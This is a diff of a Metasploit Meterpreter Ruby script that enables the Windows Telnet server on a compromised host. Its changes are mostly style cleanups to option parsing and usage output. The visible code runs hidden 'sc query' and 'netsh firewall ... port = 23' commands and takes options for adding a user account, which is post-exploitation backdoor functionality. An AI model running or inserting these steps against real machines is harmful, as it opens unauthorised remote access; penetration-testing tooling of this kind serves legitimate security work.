@@ -10,12 +10,13 @@
 
 session = client
 @@exec_opts = Rex::Parser::Arguments.new(
-		"-h" => [ false,  "Help menu."                        ],
-		"-e" => [ false,  "Enable Telnet Server only."  ],
-		"-p" => [ true,  "The Password of the user to add."  ],
-       		"-u" => [ true,  "The Username of the user to add."  ]
-		)
+	"-h" => [ false, "Help menu." ],
+	"-e" => [ false, "Enable Telnet Server only."  ],
+	"-p" => [ true,  "The Password of the user to add."  ],
+	"-u" => [ true,  "The Username of the user to add."  ]
+)
 def checkifinst(session)
+	# This won't work on windows 2000 since there is no sc.exe
 	r = session.sys.process.execute("sc query state= all",nil, {'Hidden' => true, 'Channelized' => true})
 	while(d = r.channel.read)
 		if d =~ (/TlntSvr/)
@@ -83,7 +84,7 @@ def enabletlntsrv(session)
 	else
 		print_status "\tTelnet Server Services service is already set to auto"
 	end
-	#Enabling Exception on the Firewall
+	# Enabling Exception on the Firewall
 	print_status "\tOpening port in local firewall if necessary"
 	r = session.sys.process.execute('netsh firewall set portopening protocol = tcp port = 23 mode = enable', nil, {'Hidden' => true, 'Channelized' => true})
 	while(d = r.channel.read)
@@ -136,11 +137,9 @@ def message
 	print_status "Windows Telnet Server Enabler Meterpreter Script"
 end
 def usage
-	print(
-	"Windows Telnet Server Enabler Meterpreter Script\n" +
-	"Usage: getgui -u <username> -p <password> \n" +
-	@@exec_opts.usage			
-	)
+	print_line("Windows Telnet Server Enabler Meterpreter Script")
+	print_line("Usage: gettelnet -u <username> -p <password>")
+	print_line(@@exec_opts.usage)
 end
 ################## MAIN ##################
 # Parsing of Options
@@ -156,15 +155,14 @@ enbl = nil
 			pass = val
 		when "-h"
 			usage
-			break
 		when "-n"
 			lport = val.to_i
 		when "-e"
-			enbl = 1
+			enbl = true
 		end
 
 }
-if enbl == 1
+if enbl
 	message
 	insttlntsrv(session)
 	enabletlntsrv(session)
